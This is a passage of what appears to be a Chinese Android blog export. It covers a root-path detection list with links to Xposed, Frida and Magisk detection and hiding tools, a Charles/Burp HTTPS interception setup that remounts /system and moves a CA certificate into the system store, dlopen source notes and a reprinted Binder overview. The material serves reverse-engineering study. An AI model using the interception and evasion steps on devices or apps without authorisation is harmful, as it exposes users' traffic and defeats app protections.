<h1 id="Android-Studio-Build-Output-控制台输出乱码解决"><a href="#Android-Studio-Build-Output-控制台输出乱码解决" class="headerlink" title="Android Studio Build Output 控制台输出乱码解决"></a>Android Studio Build Output 控制台输出乱码解决</h1><p>点击 Android Studio 菜单栏 Help 下拉菜单找到 <code>Edit Custom VM Options...</code>选项。</p>
<p>打开 <code>studio64.exe.vmoptions </code>文件，输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>
<p>关闭 studio，重新打开即可。</p>
<h1 id="设置-Terminal-为cmder"><a href="#设置-Terminal-为cmder" class="headerlink" title="设置 Terminal 为cmder"></a>设置 Terminal 为cmder</h1><p>打开 android studio 的设置，找到 Tools 下的 terminal 修改 Shell path 为 <code>&quot;cmd&quot; /k &quot;&quot;%CMDER_ROOT%\vendor\init.bat&quot;&quot;</code> 。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>AndroidStudio</tag>
      </tags>
  </entry>
  <entry>
    <title>Android对抗手法收集</title>
    <url>/2020/08/24/Android%E5%AF%B9%E6%8A%97%E6%89%8B%E6%B3%95%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="检测ROOT"><a href="#检测ROOT" class="headerlink" title="检测ROOT"></a>检测ROOT</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sbin/su</span><br><span class="line">/system/bin/su</span><br><span class="line">/system/xbin/su</span><br><span class="line">/data/local/xbin/su</span><br><span class="line">/data/local/bin/su</span><br><span class="line">/system/sd/xbin/su</span><br><span class="line">/system/bin/failsafe/su</span><br><span class="line">/data/local/su</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/lamster2018/EasyProtector">https://github.com/lamster2018/EasyProtector</a><br><a href="https://www.coolapk.com/apk/io.github.vvb2060.mahoshojo">https://www.coolapk.com/apk/io.github.vvb2060.mahoshojo</a></p>
<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.net.NetworkInterface.getName()</span><br></pre></td></tr></table></figure>

<h1 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h1><p><a href="https://github.com/w568w/XposedDetectLib">https://github.com/w568w/XposedDetectLib</a></p>
<p><a href="https://github.com/KagurazakaHanabi/XposedHider">https://github.com/KagurazakaHanabi/XposedHider</a></p>
<p><a href="https://github.com/vvb2060/XposedDetector">https://github.com/vvb2060/XposedDetector</a></p>
<h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><p><a href="https://github.com/darvincisec/DetectFrida">https://github.com/darvincisec/DetectFrida</a></p>
<h1 id="Magisk"><a href="#Magisk" class="headerlink" title="Magisk"></a>Magisk</h1><p><a href="https://github.com/vvb2060/MagiskDetector">https://github.com/vvb2060/MagiskDetector</a></p>
<p><a href="https://github.com/darvincisec/DetectMagiskHide">https://github.com/darvincisec/DetectMagiskHide</a></p>
<h1 id="HideRoot"><a href="#HideRoot" class="headerlink" title="HideRoot"></a>HideRoot</h1><p><a href="https://github.com/rmnscnce/hsu">https://github.com/rmnscnce/hsu</a></p>
<h1 id="Anti-VM"><a href="#Anti-VM" class="headerlink" title="Anti VM"></a>Anti VM</h1><p><a href="https://github.com/samohyes/Anti-vm-in-android">https://github.com/samohyes/Anti-vm-in-android</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android抓包</title>
    <url>/2020/12/30/Android%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<h1 id="使用-Charles-抓包"><a href="#使用-Charles-抓包" class="headerlink" title="使用 Charles 抓包"></a>使用 Charles 抓包</h1><ol>
<li>PC端共享无线网络，使用 ipconfig 命令查看 ip 地址：</li>
</ol>
<img src="/2020/12/30/Android%E6%8A%93%E5%8C%85/2020-12-30-16-09-26.png" class="">

<ol start="2">
<li>手机端设置代理</li>
</ol>
<img src="/2020/12/30/Android%E6%8A%93%E5%8C%85/2020-12-30-16-10-42.png" class="">

<ol start="3">
<li>抓包工具设置代理</li>
</ol>
<img src="/2020/12/30/Android%E6%8A%93%E5%8C%85/2020-12-30-16-12-38.png" class="">

<ol start="4">
<li>安装证书</li>
</ol>
<p>手机端访问 chls.pro&#x2F;ssl 下载证书并安装。其中可以通过 Magisk 插件 <a href="https://github.com/Androidacy/movecerts">movecerts</a> 将证书从用户证书移动到系统证书。后续即可进行抓包了。 <strong>如果无法进行抓包，尝试一下关闭 Windows 防火墙。</strong></p>
<blockquote>
<p>brup 配置好代理后，下载证书地址 <a href="http://burp/">http://burp</a> 。</p>
</blockquote>
<p>手动将用户证书移动到系统证书。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 挂载根目录，正常情况下，使其可读写</span></span><br><span class="line">mount -o rw,remount /</span><br><span class="line"><span class="comment"># 将用户证书移入系统证书目录</span></span><br><span class="line"><span class="built_in">mv</span> -f /data/misc/user/0/cacerts-added/123abc456.0 /system/etc/security/cacerts</span><br><span class="line"><span class="comment"># 重新挂载根目录，使其为只读</span></span><br><span class="line">mount -o ro,remount /</span><br></pre></td></tr></table></figure>

<h1 id="VPN-配合-Charles-抓包"><a href="#VPN-配合-Charles-抓包" class="headerlink" title="VPN 配合 Charles 抓包"></a>VPN 配合 Charles 抓包</h1><h2 id="Charles-设置"><a href="#Charles-设置" class="headerlink" title="Charles 设置"></a>Charles 设置</h2><p>首先要把 Charles 当做一个 SOCKS5 的代理服务器，所以要先设置 SOCKS5 代理服务器。打开 Proxy 设置选项，开启 SOCKS 服务器，我这里开启的端口为 8889 ，也可以随意填写。</p>
<img src="/2020/12/30/Android%E6%8A%93%E5%8C%85/2020-12-30-16-52-51.png" class="">

<p>下面介绍 3 款手机端的 VPN 应用。</p>
<p><a href="https://github.com/SagerNet/SagerNet">SagerNet</a></p>
<p><a href="https://github.com/bndeff/socksdroid">SocksDroid</a></p>
<h2 id="SocksDroid-设置"><a href="#SocksDroid-设置" class="headerlink" title="SocksDroid 设置"></a>SocksDroid 设置</h2><p>这里还有另一款 VPN 工具 <a href="Android%E6%8A%93%E5%8C%85/SocksDroid.apk">SocksDroid</a> 可以使用，这里也顺便说一下其配置方法，除了设置服务器 IP 和端口外，还需要设置一下 DNS 服务器，以适应国内网络环境。</p>
<img src="/2020/12/30/Android%E6%8A%93%E5%8C%85/2020-12-30-17-01-17.png" class="">
<img src="/2020/12/30/Android%E6%8A%93%E5%8C%85/2020-12-30-17-01-48.png" class="">

<h2 id="HTTP-x2F-HTTPS转发到Burp-Suite"><a href="#HTTP-x2F-HTTPS转发到Burp-Suite" class="headerlink" title="HTTP&#x2F;HTTPS转发到Burp Suite"></a>HTTP&#x2F;HTTPS转发到Burp Suite</h2><p>在 Charles 中，打开 External Proxy Settings 选项卡，选择把数据转到 Burp Suite 的代理服务器中。</p>
<img src="/2020/12/30/Android%E6%8A%93%E5%8C%85/2020-12-30-17-21-25.png" class="">






<p>参考连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ahPbBSfkkBsv4oy265rI2Q</span><br><span class="line">https://www.cnblogs.com/lulianqi/p/11380794.html</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android源码阅读-dlopen</title>
    <url>/2019/11/17/Android%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-dlopen/</url>
    <content><![CDATA[<blockquote>
<p>本次阅读源码来自aosp Android 8.1.0_r1，在阅读过程中根据阅读的进度随手记录</p>
</blockquote>
<p>有过 <code>linux</code> 编成经验的都应该知道使用 <code>dlopen</code> 需要包含 <code>dlfcn.h</code> 头文件，所以直接去<code>aosp/bionic/libc/include/dlfcn.h</code> 中找到 <code>dlopen</code> 的函数定义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void* dlopen(const char* filename, int flag);</span><br></pre></td></tr></table></figure>
<p>通过<code>dlopen</code>的定义找到其实现在 <code>aosp/bionic/libdl/libdl.c</code> 中，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Proxy calls to bionic loader</span><br><span class="line">void* dlopen(const char* filename, int flag) &#123;</span><br><span class="line">    /*</span><br><span class="line">  __builtin_return_address(0)的含义是，得到当前函数返回地址，即此函数被别的函数调用，然后此函数执行完毕后，返回，所谓返回地址就是那时候的地址。</span><br><span class="line">  __builtin_return_address(1)的含义是，得到当前函数的调用者的返回地址。注意是调用者的返回地址，而不是函数起始地址。 </span><br><span class="line">    */</span><br><span class="line">  const void* caller_addr = __builtin_return_address(0);//可以理解为汇编 MOV R0, LR</span><br><span class="line">  return __loader_dlopen(filename, flag, caller_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现 <code>dlopen</code> 的是通过 <code>__loader_dlopen</code> 完成其实现的。查看 <code>__loader_dlopen</code> 的实现，会发现找不到其是实现方法，只能找到相关的定义 <code>aosp/bionic/libdl/libdl.c</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__attribute__((__weak__, visibility(&quot;default&quot;)))</span><br><span class="line">void* __loader_dlopen(const char* filename, int flags, const void* caller_addr);</span><br></pre></td></tr></table></figure>
<p>通过搜索 <code>__loader_dlopen</code> 字符串，发现 <code>aosp/bionic/linker/dlfcn.cpp</code> 存在相关字符串。</p>
<p>![](&#x2F;Android源码阅读-dlopen&#x2F;2019-11-17-15-12-04.png</p>
<p>跟进去后发现，其被定义的在 <code>ANDROID_LIBDL_STRTAB</code> 字符串数组中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const char ANDROID_LIBDL_STRTAB[] =</span><br><span class="line">  // 0000000000111111 11112222222222333 333333344444444 44555555555566666 6666677777777778 8888888889999999999</span><br><span class="line">  // 0123456789012345 67890123456789012 345678901234567 89012345678901234 5678901234567890 1234567890123456789</span><br><span class="line">    &quot;__loader_dlopen\0__loader_dlclose\0__loader_dlsym\0__loader_dlerror\0__loader_dladdr\0__loader_android_up&quot;</span><br><span class="line">  // 1*</span><br><span class="line">  // 000000000011111111112 2222222223333333333444444444455555555 5566666666667777777777888 88888889999999999</span><br><span class="line">  // 012345678901234567890 1234567890123456789012345678901234567 8901234567890123456789012 34567890123456789</span><br><span class="line">    &quot;date_LD_LIBRARY_PATH\0__loader_android_get_LD_LIBRARY_PATH\0__loader_dl_iterate_phdr\0__loader_android_&quot;</span><br><span class="line">  // 2*</span><br><span class="line">  // 00000000001 1111111112222222222333333333344444444445555555555666 6666666777777777788888888889999999999</span><br><span class="line">  // 01234567890 1234567890123456789012345678901234567890123456789012 3456789012345678901234567890123456789</span><br><span class="line">    &quot;dlopen_ext\0__loader_android_set_application_target_sdk_version\0__loader_android_get_application_targ&quot;</span><br><span class="line">  // 3*</span><br><span class="line">  // 000000000011111 111112222222222333333333344444444445555555 5556666666666777777777788888888889 999999999</span><br><span class="line">  // 012345678901234 567890123456789012345678901234567890123456 7890123456789012345678901234567890 123456789</span><br><span class="line">    &quot;et_sdk_version\0__loader_android_init_anonymous_namespace\0__loader_android_create_namespace\0__loader_&quot;</span><br><span class="line">  // 4*</span><br><span class="line">  // 0000000 000111111111122222222223333 333333444444444455 555555556666666666777777777788888 888889999999999</span><br><span class="line">  // 0123456 789012345678901234567890123 456789012345678901 234567890123456789012345678901234 567890123456789</span><br><span class="line">    &quot;dlvsym\0__loader_android_dlwarning\0__loader_cfi_fail\0__loader_android_link_namespaces\0__loader_androi&quot;</span><br><span class="line">  // 5*</span><br><span class="line">  // 0000000000111111111122222 22222</span><br><span class="line">  // 0123456789012345678901234 56789</span><br><span class="line">    &quot;d_get_exported_namespace\0&quot;</span><br><span class="line">#if defined(__arm__)</span><br><span class="line">  // 525</span><br><span class="line">    &quot;__loader_dl_unwind_find_exidx\0&quot;</span><br><span class="line">#endif</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<p>继续跟进，发现 <code>g_libdl_symtab</code> 中使用了 <code>ANDROID_LIBDL_STRTAB</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static ElfW(Sym) g_libdl_symtab[] = &#123;</span><br><span class="line">  // Total length of libdl_info.strtab, including trailing 0.</span><br><span class="line">  // This is actually the STH_UNDEF entry. Technically, it&#x27;s</span><br><span class="line">  // supposed to have st_name == 0, but instead, it points to an index</span><br><span class="line">  // in the strtab with a \0 to make iterating through the symtab easier.</span><br><span class="line">  ELFW(SYM_INITIALIZER)(sizeof(ANDROID_LIBDL_STRTAB) - 1, nullptr, 0),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(  0, &amp;__dlopen, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)( 16, &amp;__dlclose, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)( 33, &amp;__dlsym, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)( 48, &amp;__dlerror, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)( 65, &amp;__dladdr, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)( 81, &amp;__android_update_LD_LIBRARY_PATH, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(121, &amp;__android_get_LD_LIBRARY_PATH, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(158, &amp;dl_iterate_phdr, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(183, &amp;__android_dlopen_ext, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(211, &amp;__android_set_application_target_sdk_version, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(263, &amp;__android_get_application_target_sdk_version, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(315, &amp;__android_init_anonymous_namespace, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(357, &amp;__android_create_namespace, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(391, &amp;__dlvsym, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(407, &amp;__android_dlwarning, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(434, &amp;__cfi_fail, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(452, &amp;__android_link_namespaces, 1),</span><br><span class="line">  ELFW(SYM_INITIALIZER)(485, &amp;__android_get_exported_namespace, 1),</span><br><span class="line">#if defined(__arm__)</span><br><span class="line">  ELFW(SYM_INITIALIZER)(525, &amp;__dl_unwind_find_exidx, 1),</span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>将相关代码复制到一个C源码文件，使用 <code>g++ -E</code> 宏展开并优化后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static ElfW(Sym) g_libdl_symtab[] = &#123;</span><br><span class="line"></span><br><span class="line">  &#123; sizeof(ANDROID_LIBDL_STRTAB) - 1, 0, 0, 0, reinterpret_cast&lt;Elf64_Addr&gt;(nullptr), 0, &#125;,</span><br><span class="line">  &#123; 0, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__dlopen), 0, &#125;,</span><br><span class="line">  &#123; 16, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__dlclose), 0, &#125;,</span><br><span class="line">  &#123; 33, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__dlsym), 0, &#125;,</span><br><span class="line">  &#123; 48, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__dlerror), 0, &#125;,</span><br><span class="line">  &#123; 65, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__dladdr), 0, &#125;,</span><br><span class="line">  &#123; 81, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_update_LD_LIBRARY_PATH), 0, &#125;,</span><br><span class="line">  &#123; 121, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_get_LD_LIBRARY_PATH), 0, &#125;,</span><br><span class="line">  &#123; 158, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;dl_iterate_phdr), 0, &#125;,</span><br><span class="line">  &#123; 183, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_dlopen_ext), 0, &#125;,</span><br><span class="line">  &#123; 211, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_set_application_target_sdk_version), 0, &#125;,</span><br><span class="line">  &#123; 263, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_get_application_target_sdk_version), 0, &#125;,</span><br><span class="line">  &#123; 315, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_init_anonymous_namespace), 0, &#125;,</span><br><span class="line">  &#123; 357, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_create_namespace), 0, &#125;,</span><br><span class="line">  &#123; 391, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__dlvsym), 0, &#125;,</span><br><span class="line">  &#123; 407, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_dlwarning), 0, &#125;,</span><br><span class="line">  &#123; 434, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__cfi_fail), 0, &#125;,</span><br><span class="line">  &#123; 452, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_link_namespaces), 0, &#125;,</span><br><span class="line">  &#123; 485, (STB_GLOBAL &lt;&lt; 4), 0, 1, reinterpret_cast&lt;Elf64_Addr&gt;(&amp;__android_get_exported_namespace), 0, &#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>2019-11-17 01:47:00.768 10666-10666&#x2F;com.example.ndkdebug E&#x2F;linker: library “&#x2F;system&#x2F;lib64&#x2F;libandroid_runtime.so” (“&#x2F;system&#x2F;lib64&#x2F;libandroid_runtime.so”) needed or dlopened by “&#x2F;data&#x2F;app&#x2F;com.example.ndkdebug-tJLtYCKjLoRt2XhNQlIu9A&#x3D;&#x3D;&#x2F;lib&#x2F;arm64&#x2F;libnative-lib.so” is not accessible for the namespace: [name&#x3D;”classloader-namespace”, ld_library_paths&#x3D;””, default_library_paths&#x3D;”&#x2F;data&#x2F;app&#x2F;com.example.ndkdebug-tJLtYCKjLoRt2XhNQlIu9A&#x3D;&#x3D;&#x2F;lib&#x2F;arm64:&#x2F;data&#x2F;app&#x2F;com.example.ndkdebug-tJLtYCKjLoRt2XhNQlIu9A&#x3D;&#x3D;&#x2F;base.apk!&#x2F;lib&#x2F;arm64-v8a”, permitted_paths&#x3D;”&#x2F;data:&#x2F;mnt&#x2F;expand:&#x2F;data&#x2F;data&#x2F;com.example.ndkdebug”]</p>
<p>未完待续。。。</p>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android源码阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>Binder从入门到放弃（框架篇）</title>
    <url>/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>转载：<a href="https://blog.csdn.net/feelabclihu/article/details/105534145">https://blog.csdn.net/feelabclihu/article/details/105534145</a></p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Binder</code> 从入门到放弃包括了上下篇，上篇是框架部分，即本文。下篇通过几个典型的 <code>binder</code> 通信过程来呈现其实现细节，稍后发布，敬请期待。</p>
<h1 id="一、什么是Binder？"><a href="#一、什么是Binder？" class="headerlink" title="一、什么是Binder？"></a>一、什么是Binder？</h1><p><code>Binder</code> 是安卓平台上的一种 <code>IPC framework</code> ，其整体的架构如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-22-17.png" class="">

<p><code>Binder</code> 渗透到了安卓系统的各个软件层次：在应用层，利用 <code>Framework</code> 中的 <code>binder Java</code> 接口，开发者可以方便的申请系统服务提供的服务、实现自定义 <code>Service</code> 组件并开放给其他模块等。由于 <code>Native</code> 层的 <code>binder</code> 库使用的是 <code>C++</code> ，因此安卓框架中的 <code>Binder</code> 模块会通过 <code>JNI</code> 接口进入 <code>C/C++</code> 世界。在最底层， <code>Linux</code> 内核提供了 <code>binder</code> 驱动，完成进程间通信的功能。</p>
<p><code>Binder</code> 对安卓非常重要，绝大多数的进程通信都是通过 <code>Binder</code> 完成。 <code>Binder</code> 采用了 <code>C/S</code> 的通信形式：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-23-06.png" class="">

<p>从进程角度看，参与 <code>Binder</code> 通信的实体有三个：<code>binder client</code> 、 <code>binder server</code> 和 <code>service manager</code> 。 <code>Binder server</code> 中的 <code>service</code> 组件对外提供了服务，但是需要对外公布，因此它会向 <code>service manager</code> 注册自己的服务。 <code>Binder client</code> 想要请求服务的时候统一到 <code>service manager</code> 去查询，获取了对应的描述符后即可以通过该描述符和 <code>service</code> 组件进行通信。当然，这些 <code>IPC</code> 通信并不是直接在 <code>client</code> 、 <code>server</code> 和 <code>service manager</code> 之间进行的，而都是需要通过 <code>binder driver</code> 间接完成。</p>
<p>安卓应用程序开发是基于组件的，也就是说通过四大组件（ <code>Activity</code> 、 <code>Service</code> 、 <code>Broadcast Receiver</code> 和 <code>Content Provider</code> ），开发者可以象搭积木一样的轻松开发应用程序，而无需关心底层实现。然而安卓这种面向对象的应用框架环境却是基于传统的 <code>Linux</code> 内核构建的，这使得安卓在进程间通信方面遇到了新的挑战，这也就是为何谷歌摒弃了传统的内核 <code>IPC</code> 机制（管道、命名管道、 <code>domain socket</code> 、 <code>UDP/TCP socket</code> 、 <code>system V IPC</code> ， <code>share memory</code> 等），建立了全新的 <code>binder</code> 通信形式，具体细节我们下一章分解。</p>
<h1 id="二、为什么是Binder？"><a href="#二、为什么是Binder？" class="headerlink" title="二、为什么是Binder？"></a>二、为什么是Binder？</h1><p>在上一节中，我们简单的描述了 <code>binder</code> 的 <code>C/S</code> 通信模型，在内核已经提供了 <code>socket</code> 形态的 <code>C/S</code> 通信机制的情况下，在安卓系统上直接使用 <code>socket</code> 这种 <code>IPC</code> 机制似乎是顺理成章的，为何还要重新制作一个新的轮子呢？是否需要新建轮子其实是和需求相关的，下面我们会仔细分析安卓系统上，组件之间 <code>IPC</code> 机制的需求规格，从而窥视谷歌创建全新 <code>binder</code> 通信机制背后的原因。</p>
<h2 id="1、安卓系统需要的是一个IPC框架"><a href="#1、安卓系统需要的是一个IPC框架" class="headerlink" title="1、安卓系统需要的是一个IPC框架"></a>1、安卓系统需要的是一个IPC框架</h2><p>为了提高软件生产效率，安卓的应用框架希望能够模糊进程边界，即在 A 组件调用 B 组件的方法的时候，程序员不需要考虑是否跨进程。即便是在不同的进程中，对 B 组件的服务调用仍然象本地函数调用一样简单。传统 <code>Linux</code> 内核的 <code>IPC</code> 机制是无法满足这个需求的，安卓需要一个复杂的 <code>IPC framework</code> 能够支持线程池管理、自动跟踪引用计数等有挑战性的任务。</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-23-49.png" class="">

<p>当然，基于目前 <code>Linux</code> 内核的 <code>IPC</code> 机制，也可以构建复杂的 <code>IPC framework</code> ，不过传统的内核 <code>IPC</code> 机制并没有考虑面向对象的应用框架，因此很多地方实现起来有些水土不服。上图给了一个简单的例子：在一个地址空间中跟踪对象的引用计数非常简单，可以在该对象内部构建一个引用计数，每当有本进程对象引用 <code>service</code> 组件对象的时候，引用计数加一，不再引用的时候减一，没有任何对象引用 <code>service</code> 组件对象的时候，该对象可以被销毁。不过，当引用该 <code>service</code> 组件的代理对象来自其他进程空间（例如 <code>binder client</code> 的组件代理对象）的时候，事情就不那么简单了，这需要一个复杂的 <code>IPC framework</code> 来小心的维护组件对象的引用计数，否则在 <code>server</code> 端销毁了一个组件对象，而实际上有可能在 <code>client</code> 端还在远程调度该 <code>service</code> 组件提供的服务。</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-24-18.png" class="">

<p>为了解决这个问题， <code>binder</code> 驱动构建了 <code>binder ref</code> 和 <code>binder node</code> 数据对象，分别对应到上层软件中的 <code>service</code> 组件代理和 <code>service</code> 组件对象，同时也设计了相应的 <code>binder</code> 通信协议来维护引用计数，解决了传统的 <code>IPC</code> 机制很难解决的跨进程对象生命周期问题。</p>
<h2 id="2、安卓系统需要的是高效IPC机制"><a href="#2、安卓系统需要的是高效IPC机制" class="headerlink" title="2、安卓系统需要的是高效IPC机制"></a>2、安卓系统需要的是高效IPC机制</h2><p>我们再看一下性能方面的需求：由于整个安卓系统的进程间通信量比较大，我们希望能有一个性能卓越的 <code>IPC</code> 机制。大部分传统 <code>IPC</code> 机制都需要两次拷贝容易产生性能问题。而 <code>binder</code> 只进行了一次拷贝，性能优于大部分的传统 <code>IPC</code> 机制，除了 <code>share memory</code> 。当然，从内存拷贝的角度看，<code>share memory</code> 优于 <code>binder</code> ，但实际上如果基于 <code>share memory</code> 设计安卓的 <code>IPC framework</code> ，那么还是需要构建复杂的同步机制，这也会抵消 <code>share memory</code> 部分零拷贝带来性能优势，因此 <code>Binder</code> 并没有选择共享内存方案，而是在简单和性能之间进行了平衡。在 <code>binder</code> 机制下，具体的内存拷贝如下图所示：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-24-46.png" class="">

<p><code>binder server</code> 会有专门二段用于 <code>binder</code> 通信的虚拟内存区间，一段在内核态，一段在用户空间。这两段虚拟地址空间映射到同样的物理地址上，当拷贝数据到 <code>binder server</code> 的内核态地址空间，实际上用户态也就可以直接访问了。当 <code>Binder client</code> 要把一个数据块传递到 <code>binder server</code>（通过 <code>binder transaction</code> ）的时候，实际上会在 <code>binder server</code> 的内核虚拟地址空间中分配一块内存，并把 <code>binder client</code> 的用户地址空间的数据拷贝到 <code>binder server</code> 的内核空间。因为 <code>binder server</code> 的 <code>binder</code> 内存区域被同时映射到用户空间和内核空间，因此就可以省略一次数据考虑，提高了性能。</p>
<p>并不是说安卓不使用共享内存机制，实际上当进程之间要传递大量的数据的时候（例如 APP 的图形数据要传递到 <code>surfaceflinger</code> 进行实际的显示）还是使用了 <code>share memory</code> 机制（ <code>Ashmem</code> ）。安卓使用文件描述符来标示一块匿名共享内存， <code>binder</code> 机制可以把文件描述符从一个进程传递到另外的进程，完成文件的共享。一个简单的示意图如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-25-08.png" class="">

<p>在上图中， <code>binder client</code> 传递了 <code>fd x</code> （ <code>binder client</code> 有效的描述符）到 <code>binder server</code> ，实际上 <code>binder</code> 驱动会通过既有的内核找到对应的 <code>file object</code> 对象，然后在 <code>binder server</code> 端找到一个空闲的<code>fd y</code>（ <code>binder server</code> 进程有效），让其和 <code>binder client</code> 指向同一个对象。这个 <code>binder client</code> 传递了 <code>fd x</code> 到 <code>binder server</code> ，在 <code>server</code> 端变成 <code>fd y</code> 并实现了和 <code>client</code> 进程中 <code>fd x</code> 指向同一个文件的目标。而传统的 <code>IPC</code> 机制（除了 <code>socket</code> ）没有这种机制。</p>
